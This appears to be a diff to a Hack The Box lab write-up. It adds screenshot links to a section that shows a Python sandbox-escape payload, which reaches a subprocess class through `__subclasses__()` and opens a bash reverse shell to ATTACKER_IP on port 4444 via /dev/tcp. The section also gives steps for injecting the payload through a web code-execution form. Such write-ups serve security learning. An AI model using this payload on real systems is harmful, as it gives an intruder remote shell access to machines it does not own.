@@ -115,6 +115,9 @@ Flags explanation:
 
 📌 Step 2: Craft the Reverse Shell Payload
 
+![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code5.png?raw=true)
+![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code7.png?raw=true)
+
 Use Python’s dynamic class reference to spawn a bash shell back to your machine:
 
 (().__class__.__base__.__subclasses__()[317])(["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
@@ -139,3 +142,5 @@ Inject the payload through the web interface:
     Enter the payload in the code execution area.
 
     Trigger execution.
+
+![payload](https://github.com/PrimeMurcia/htb/blob/main/code/ss/code8.png?raw=true)
